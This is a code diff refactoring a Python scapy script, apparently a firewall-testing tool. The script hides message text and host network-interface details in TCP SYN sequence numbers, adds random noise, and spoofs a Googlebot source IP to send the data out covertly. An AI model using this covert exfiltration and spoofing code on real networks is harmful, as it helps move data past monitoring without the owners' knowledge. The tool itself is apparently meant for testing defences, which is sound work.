@@ -52,7 +52,6 @@ import netifaces
 import re
 import time
 
-
 # ================
 # Global variables
 # ================
@@ -62,9 +61,10 @@ mode = 'demo'
 # mode = 'live'
 
 thishost = os.uname()[1]
-multiplier = 16777216        # the server will be performing the division
+multiplier = 16777216  # the server will be performing the division
 message = 'hello from ' + thishost
-seq_array = []  # clear before each use
+# Clear before each use. Used by initial sequence numbers and IP ID tests
+exfilArray = []
 
 destination = '127.0.0.1'
 # When using a bounce host, the bounce host will be the destination
@@ -75,21 +75,13 @@ spoof = '66.249.66.1'  # Spoof crawl-66-249-66-1.googlebot.com
 # Get our real ip. This is especially useful in NAT'd environments.
 interfaces = netifaces.interfaces()
 
+
 # =========
 # Functions
 # =========
 
-
 # TODO:
 # Add functions to perform the various techniques to test a firewall against.
-
-def exfil_ipid():
-	print '[*] Attempting ID identification exfil..'
-
-
-def exfil_bounce():
-	print '[*] Attempting Ack sequence number bounce exfil..'
-
 
 # Convert message
 # Lots of options here but we're going to convert each letter of the message
@@ -100,10 +92,10 @@ def convert_message(message):
 		c = ord(char)
 		# While we are here, might as well generate our SYN packet sequence
 		# number.
-		seq = c * multiplier
+		exfilChar = c * multiplier
 		# Add seq to the global seq_array.
-		seq_array.append(seq)
-		print '%s=%d, seq=%d' % (char, c, seq)
+		exfilArray.append(exfilChar)
+		print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
 
 
 # I think single quotes are killing things
@@ -112,7 +104,7 @@ def trim_message(message):
 	trimmed = []
 	# Check for a valid char
 	for char in message:
-		#valid = re.match('^[\w-]+$', char) is not None
+		# valid = re.match('^[\w-]+$', char) is not None
 		invalid = re.match('^\'', char) is not None
 		print '[*] invalid: %s is %s' % (char, invalid)
 		# Add valid chars to trimmed
@@ -125,7 +117,7 @@ def trim_message(message):
 
 def add_n0ise(i):
 	print '[*] adding n0ise..'
-	y = seq_array[i]
+	y = exfilArray[i]
 	# Add some randomness for schlitz n giggles
 	randy = random.randint(-99999999, 99999999)
 	pkt.seq = y + randy
@@ -135,23 +127,32 @@ def add_n0ise(i):
 	send(pkt)
 
 
+def exfil_ipid():
+	print '[*] Attempting ID identification exfil..'
+	i = 0
+
+
 # Send message using initial sequence numbers. Add noise.
 def exfil_iseq():
 	i = 0
 	k = 8192  # window size
-	for s in seq_array:
+	for c in exfilArray:
 		add_n0ise(i)
 		pkt.window = k
 		pkt.ttl = 64
-		pkt.seq = seq_array[i]
+		pkt.seq = exfilArray[i]
 		# slow our roll
 		time.sleep(0.5)
 		send(pkt)
 		i += 1
 
 
+def exfil_bounce():
+	print '[*] Attempting Ack sequence number bounce exfil..'
+
+
 # This function sends interface details for interfaces of interest, AF_INET
-# family.
+# family. This function currently uses the initial sequence number.
 def send_iface():
 	print '[*] interfaces: %s' % interfaces
 	# Interesting in sending found en*, eth*, and wlp* interface data
@@ -170,6 +171,8 @@ def send_iface():
 				trimmed = trim_message(message)
 				print '[*] Trimmed message: %s' % trimmed
 				convert_message(trimmed)
+				# Call the testing method we'd like to test
+				# TODO: run all tests or run a specific test, specify here.
 				exfil_iseq()
 		except:
 			# skip, do nothing
@@ -187,24 +190,23 @@ convert_message(message)
 # How long is our message. We can use this when adding noise. If we use the
 # ttl then this will be easy to crack. We might be able to create an algorithm
 # that's complex enough to at least frustrate our adversaries.
-msglen = len(seq_array)
+msglen = len(exfilArray)
 
 # Craft our basic packet.
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
-pkt = IP(src=spoof, dst=destination)/TCP(dport=37337, flags='S')
+pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')
 
 # Attempt data exfiltration using initial sequence numbers
 exfil_iseq()
 
-seq_array = []  # clear before each use
+exfilArray = []  # clear before each use
 
 print '[*] Sent: %s' % message
 print '[*] Getting ready to send network interface details'
 print '[*] Resetting message and seq_array'
 
 message = ''
-seq_array = []
+exfilArray = []
 
 # FIXME: sending interface details is not working
 send_iface()
-
